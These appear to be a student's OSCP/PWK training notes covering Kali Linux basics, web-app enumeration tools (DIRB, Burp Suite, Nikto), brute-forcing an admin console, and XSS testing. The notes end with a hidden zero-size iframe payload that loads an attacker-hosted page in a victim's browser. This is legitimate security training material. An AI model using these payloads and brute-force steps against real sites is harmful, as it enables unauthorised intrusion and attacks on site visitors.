# PWK-2.0
Notes captured from the OSCP training.

Note Taking Tools
---
- Joplin (Linux)
- OneNote (Windows)
- DayOne (MacOS)
- MDwiki (Linux)

Finding your way around Kali
---

kali adheres to the filesystem hierarchy standard (FHS), which provides a familiar and universal layout for all linux users. The most useful directories are:

+ `/bin` basic programs (ls, cd, cat, etc)
+ `/sbin` system programs (fdisk, mkfs, sysctl, etc)
+ `/etc` configuration files
+ `/tmp` temporary files (typically deleted on boot)
+ `/usr/bin` applications (ap, ncat nmap, etc)
+ `/usr/share` application support and data files

Perform keyword searches when using the `man` command for searching documentation:

```
$ man -k passwd
$ man -k find
```

Using regular expression enclosed by a caret and a dollar sign to match the entire line and avoid sub-string matches.

```
$ man 5 '^passwd$'
```

Although a bit crude, using the `apropos` command is helpful for finding a particular command based on the description:

```
$ apropos partition
```

Create multiple directories at once which will also create any required parent directories.

```
$ mkdir -p test/{recon,exploit,report}
$ ls -l test/
```

### Finding files

The three most common Linux commands used to locate files in Kali are `find`,`locate`,`which`, although these utilities have similarities, they work differently when returning data, which is why they are used in different circumstances.


```
$ echo $PATH
$ which sbd
$ which pwd
```

The `locate` command is the quickest way to find the locations of files and directories in Kali. In order to providde much shorter search times, `locate` searches a built-in database named `locate.db` rather than the entire hard disk itself. This database is automatically updated on a regular basis by the `cron` scheduler.

```
$ sudo updatedb
$ locate id
```

The `find` command is the most complex and flexible search among the three. Mastering its syntax can sometimes be tricky, but its capabilities go far beyond a normal file search.

```
$ sudo find / -name bitwarden*
$ mlocate -b bitwarden
```

The advantages of `find` are that it can search for files and directories by more than just the name, including search by file age, size, owner, filetype, timestamp or permissions.

Managing Kali Linux Services
---

Kali is a specialized Linux distribution aimed at security professionals. As such, it contains several non-standard features. Since it ships with several services pre-installed, this section covers how to update its settings to prevent network services from starting at boot time.

```
$ sudo systemctl start ssh
$ sudo ss -antlp | grep sshd
```

To enable `ssh` at boot time, first change the default root password.

```
$ sudo systemctl enable ssh
```

`systemctl` can be used to enable and disable most services within Kali Linux.

The Apache HTTP service is often used during a penetration test, either for hosting a site, or providing a platform for downloading files to a victim machine.

```
$ sudo systemctl start apache2
$ sudo ss -antlp | grep apache
$ sudo systemctl enable apache2
```

Most services in Kali Linux are operated in the same manner as SSH and HTTP, through their service or init scripts. To see a table of available services, run `systemctl list-unit-files`

### Search, installing, and removing tools
In this section, the Advanced Package Tool (APT) toolset is covered along with the commands that are useful in performing maintenance operations on the Kali Linux OS.

APT is a set of tools that helps manage packages, or applications, on a Debain-based system. Since Kali is based on Debian, we can use APT to install and remove applications, update packages, and even upgade the entire system. The magic of APT lies in that it is a complete package management system that installs or removes the requested package by recursively satisfying its requirements and dependencies.

```
$ sudo apt update
```

Afer the APT database has been updated, we can upgade the installed packages and core system to the latest versions using the `apt upgrade` command.

To upgrade a single package:

```
$ apt upgrade metasploit-framework
```

Search for packages:

```
$ apt-cache search pure-ftpd
```

APT searches for the requested keyword in the package's description rather than the package name itself.

```
$ apt show resource-agents
$ sudo apt install pure-ftpd
```

Similarly, we can remove a package by purging it:

```
$ sudo apt remove --purge pure-ftpd
```

`dpkg` is the ore tool used to install a package, either directly or indirectly through APT. It's also the tool preferred as it operates offline and doesn't require an internet connection.

```
$ sudo dpkg -i man-db_x.x.x.x-5_amd64.deb
```

This section covered a baseline for upcoming modules, exploring tips and tricks for new users and reviewed somes standards that more advanced users may appreciate.

Command-Line Fun
---


Web Application Attacks
---
In this module, the focus is on the identification and exploitation of common web appication vulnerabilities. Modern development frameworks and hosting solutions have simpliefied the process of building and deploying web-based applications. However, these applications usually expose a large attack surface becuase of a lack of mature application code, multiple dependencies, and insecure server configuration.

Web applications can be written in a variety of programming languages and frameworks, each which can introduce specific types of vulnerabilities. However, the most common vulnerabilities are similar in concept, regardless of the underlying technology stack.

This section covers web application vulnerability enumeration and expoitation. The attack vectors covered will serve as a basic building blocks used to construct more advanced attacks.

### Web Application Assessment Methodology
As a first step, we should gather information about the application. 

- What does the application do?
- What language is it written in?
- What server software is the application running on?

The answers to these and other basic questions will help guide us towards our first or next potential attack vector.

As with any offensive penetration test, the goal of each attempted attack or exploit is to increase our permissions within the application or pivot to another application or target. Each successful exploit along the way may grant access to new functionality or components within the application. We may need to sucessfully execute several exploits to advance from an unauthenticated user account access to any kind of shell on the system.

#### Web Application Enumeration
Before launching any attacks on a web application, we should attempt to discover the technology stack in use, which generally consists of:

- Programming language and frameworks
- Web server software
- Database software
- Server OS

There are several techniques that we can use to gather this information directly from the browser. Most modern browsers include developer tools that cacn assist in the enumeration process eg., Developer Console/Tools.

#### Inspecting URLs
File extensions part of the URL can reveal the programming language that the application was written in. Some of these like `php` are straightforward, but other extensions are more cryptic and vary based on the frameworks in use. Java may use `.jsp`, `.do` or `.html`

Though these are becoming less common as many languages and frameworks now support the concept of routes, which allow developers to map a URI to a section of code. Applications leveraging routes use logic to determine what content is returned to the user and make URI extensions largely irrelevant.

#### Inspecting Page Content
Although URL inspection can provide some clues about the target web application, most context clues can be found in the source of the web page. By using Firefox's Debugger tool `Ctrl Shift K` displays the page's resourecs and content, which varies by application. The debugger tool may display JavaScript frameworks, hidden input fields, comments, client-side controls within HTML, JavaScript and much more.

#### Viewing Response Headers
A lot of additional information can be gleaned from response headers using web proxies, which intercept requets and responses between a client and a webserver. From a browser like Firefox, the Network pane could be used to see requests/responses without the need to setup a proxy to do so. A response header like `x-amz-cf-id` indicates that the application uses Amazon CloudFront.

#### Inspecting Sitemaps
Web applications can include sitemap files to help search engine bots crawl and index their sites. These files also include directives of which URLs not to crawl. These are usually sensitve pages or administrative consoles -- exactly the sort of pages we are interested in.

The two most common sitemap filenames are `robot.txt` and `sitemap.xml`

```
$ curl https://www.google.com/robots.txt
```

_Allow_ and _Disallow_ are directives for web crawlers indicating pages or directories that  polite web crawlers may or may not access, respectively. Sitemap file should not be overlooked as they may contain clues about the website layout or other interesting information.

#### Locating Administration Consoles
Webservers ship with remote administration web applications, or consoles, which are accessible via a particular URL and often listening on a specific port.

Two cmmon examples are the _manager_ application for _Tomcat_ and _phpMyAdmin_ for MysQL hosted at `/manager/html` and `/phpmyadmin` respectively.

while these consoles can be restricited to local access or may be hosted on custom TCP ports, they could often be found exposed by default configurations. Regardless, a penetration test should check the default console locations, identified in the application server software documentation.

### Web Application Assessment Tools
There are a variety of tools that can aid in discovering and exploiting web application vulnerabilities, many of which come pre installed with Kali. Some of these tools and browser extentions are covered in this section, and in a later section, shift our focus to manual vulnerability enumeration and exploitation.

> Although automated tools increase our productivity as penetration testers, we must also understand manual exploitation techniques since tools will not always be available in every situation and manual techniques offer greater flexibility and customization. Tools and automation make our job easier, they don't do the job for us.

#### DIRB
A web content scanner that uses a wordlist to find directories and pages by issuing requests to the server. DIRB can identify valid web pages on a web server even if the main index page is missing.

By default, DIRB will identify interesting diretories on the server but it can also be customized to search for spsecific directories, use custom dictionaries, set a custom cookie or header on each request, and much more.

```
$ dirb http://www.example.com -r -z 10
```

#### Burp Suite
A GUI-based collection of tools geared towards web application security testing, arguably best known as a powerful proxy tool. CE version exist mainly containing tools used in manual testing, the commercial version includes additional features, including a forbmidable WAVS.

```
$ burpsuite
```

By default, Burp Suite enables a proxy listener on `localhost:8080`. This is the host and port that our browser must connect to in order to proxy traffic through Burp Suite.

In the Firefox extension store, search for _FoxyProxy Basic_ which is a simple on/of proxy switcher add-on for Firefox.

Use `about:addons` in order to enable or disable extensions. Though two versions exist for FoxyProxy: Basic and Standard, only Basic is required as it is easier to configure and the other functionality isn't required.

> If you see requests for `detectportal.firefox.com` showing in the proxy history, this is a captive portal webpage that serves as a gateway page when attempting to browse the internet. It is displayed when accepting a UA or authenticating through a browser to a Wi-Fi network. In order to ignore these requests, enter `about:config` in the address bar, ignore the Firefox warning, proceed by clicking "I accept the risk!". Finally, search for `network.captive-portal-service.enabled` and double click to change the boolean to false. This will prevent those requests from appearing in the proxy history.

Bur can easily decrypt HTTPS traffic by generating its own SSL/TLS certificate, but doing so can generate noisy warnings. In order to avoid this, generate an issue a new certificate to import into Firefox.

You could ensure Burp Suite CA certificates are unique by regenerating it yourself. Navigate to `Proxy > Options > Proxy Listeners` and click `Regenerate CA certificate`.

Click `Yes` on the confirmation dialog and restart Burp Suite.

To import the new CA certificate into Firefox, load up `http://burp` to find a link to the certificate.

To view the certificate, we click _CA Certificate_ on this screen or connect to `http://burp/cert` and save the `cacert.der` file to your local machine.

Once downloaded, drag and drop it into Firefox, select _Trust this CA to identiy websites_ and click OK.

#### Nikto
A highly configurable Open Source web server scanner that tests for thousands of dangerous files and programs, vulnerable server versions and various server configuration issues. It isn't designed for stealth as it will send many requests and embed information about itself in the UA header.

```
$ nikto -host=http//www.example.com -maxtime=30s
```

### Exploiting web-based vulnerabilities
Beginning with admin console enumeration and exploitation. Once we've located an admin cosnole, the simplest "exploit" is just to log into it. Attempting default username/password pairs, or using enumerated information to guess working credentials or attempt brute force.

```
$ dirb http://target -r
```

Scanning first with `dirb` will allow us to identify the `/phpmyAdmin` directory and using BurpSuite's advanced Repeater feature, allow us to extract the tokens from the requests and use _Pitchfork_ to brute force the login in search of valid credentials.

#### Cross-Site Scripting (XSS)
One of the most important features of a well-defended web application is data sanitization, a process in which user input is processed, removing or transforming all dangerous characters or strings. unsanitized data allows an attacker to inject and potentially execute malicious code. When this unsanitized input is displayed on a web page, this creates a XSS vulnerability. 

Once though to be a relatively low-risk vulnerability, XSs today is both high-risk and prevalent, allowing attackers to inject client side scripts, such as JS, into web pages viewed by other users.

There are three Cross-Site Scripting variats: store, reflected, and DOM-based.

- Stored XSS attacks, also known as Persistent XSS, occurs when the exploit payload id stored in a database or otherwise cached by a server. The web application then retrieves this payload and displays it to anyone that views a vulnerable page. A single Stored XSS vulnerability can therefore attack all users of the site. Stored XSS vulnerabilities can often exist in forum software, especially in comment sections, or in product reviews.

- Reflected XSS attacks usually include the payload in a crafted request or link. The web application takes this value and places it into the page content. This variant only attacks the person submitting the request or viewing the ink. Reflected XSS vulnerabilities can often occur in search fields and results, as well as anywhere user input is included in error messages.

- DOM-based XSS attackers are similar to the other two types, but take place solely within the page's Document Object Model (DOM). We won't get into many details at this point, but a brower parses a page's HTML content and generates an internal DOM representation. JavaScript can programmatically interact with this DOM. This variant occurs when a page's DOM is modified with user-controlled values. DOM-bsaed XSS can be stored or reflected, the key difference is that DOM-based XSS attacks occur when a browser parses the page's content and inserted JavaScript is executed.

Regardless of how the XSS payload is delivered and executed, the injected scripts run under the context of the user viewing the affected page. That is to say, the user's browser, not the web application, executes the XSS payload. Still, these attacks can have significant impact resulting in session hijacking, forced redirection to malicious pages, execution of local applications as that user, and more.

#### Identifying XSS Vulnerabilities
Potential entry points for XSS can be found  by examining a web application and identifying input fields (such as search fields) that accept unsanitized input which is displayed as output in subsequent pages. Once an entry point is identified, submitting special characters and observing the output to see if any of the special characters returned unfiltered would be the basis to determine if the input fields are vulnerable.

The most common special characters used for this purpose include: `< > ' " { } ;`

The purpose of these special characters are HTML uses `<` and `>` to denote elements, the various components that make up an HTML document. JavaScript uses `{` and `}` in function declarations. Single `'` and double `"` quotes are used to denote strings and semicoons `;` are used to mark the end of a statement. 

If the application does not remove or encode these characters, it may be vulnerable to XSS as the characters can be used to introduce code into the page.

> While there are multiple types of encoding, the ones we will encounter most often in web appications are HTML encoding and URL encoding, sometimes referred to as percent encoding is used to convert non-ASCII characters in URLs, for example converting a space to "%20"

> HTML encoding (of character references) can be used to didsplay characters that normally have special meanings, like tag elements. For example, "&lt;" is the character reference for "<". When encountering this type of encoding, the browser will not interpret the character as the start of an element, but will display the actual character as-is.

If we inject these special characters into the page, the browser will treat them as code elements. You could then begin to build code to execute in the vitim's browser.

we ma need different sets of characters depending on where our input is being included. For example, if our input is being added between _div_ tags, we will need to include our own script tags and will need to be able to inject `<` and `>` as part of the payload. If our input is being added within an existing JavaScript tag, we might only need quotes and semicolons to add our own code.

In order to test for XSS, find an input fields for name on a test application and insert values like:

```
hello "; < >
```

Reviewing the resulting message in the _Inspector_ tool, you could see that the characters were not removed or encoded.

Since input is not filtered or sanitized, and our special characters have passed through into the output, the conditions look right for an XSS vulnerability. 

> Where should data be sanitized? On submission or when it's displayed? Ideally, data will be sanitized in both places. Sanitizing both locations would be an example of Defense in Deph, a security practice and principle that advocates adding layers of defenses anywhere possible. This tends to create more robust applications. However, if sanitization is only applied in one place, it should be applied consistently. In PHP, the `htmlspecialchars` function can be used to convert key characters into HTML entities before rendering them into strings.


#### Content Injection
XSS vulnerabilities are often used to deliver client-side attacks as they allow for the redirection of a victim's borwser to a location of the attacker's choosing. A stealthy alternative to a redirect is to inject an invisible _iframe_ like the following:

```
<iframe src=http://x.x.x.x/report height="0" width="0"></iframe>
```

An iframe is used to embed another file, such as an image or another HTML file, within the current HTML document. In our case, "report" is a file hyperlinked to our attack machine, and the iframe is invisible because it has no size since the height and width are set to zero.